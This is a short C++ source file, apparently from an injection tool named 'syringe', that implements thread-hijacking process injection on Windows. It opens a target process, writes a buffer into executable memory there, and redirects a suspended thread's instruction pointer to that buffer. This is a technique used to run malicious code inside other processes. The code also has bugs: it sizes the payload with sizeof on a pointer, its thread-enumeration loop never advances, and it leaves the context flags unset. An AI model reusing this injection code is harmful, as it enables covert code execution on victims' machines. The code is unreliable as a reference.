#include "../../includes/injection/thread.hpp"


/*
    *    syringe/injection/thread.cpp
    *    Date: 12/6/21
    *    Author: 0x1CA3
*/


void TInjection::Execute(int pid, char *s) {
    HANDLE t_h;
    CONTEXT c_h;
    THREADENTRY32 t;
    
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    PVOID buf = VirtualAllocEx(h, NULL, sizeof(s), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h, buf, s, sizeof(s), NULL);

    HANDLE ss = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(ss, &t);
    
    while (Thread32First(ss, &t)) {
        if (t.th32OwnerProcessID == pid) {
            t_h = OpenThread(THREAD_ALL_ACCESS, FALSE, t.th32ThreadID);
            break;
        }
    }
    
    SuspendThread(t_h);
    GetThreadContext(t_h, &c_h);
    c_h.Eip = (DWORD_PTR)buf;
    SetThreadContext(t_h, &c_h);
    ResumeThread(t_h);
}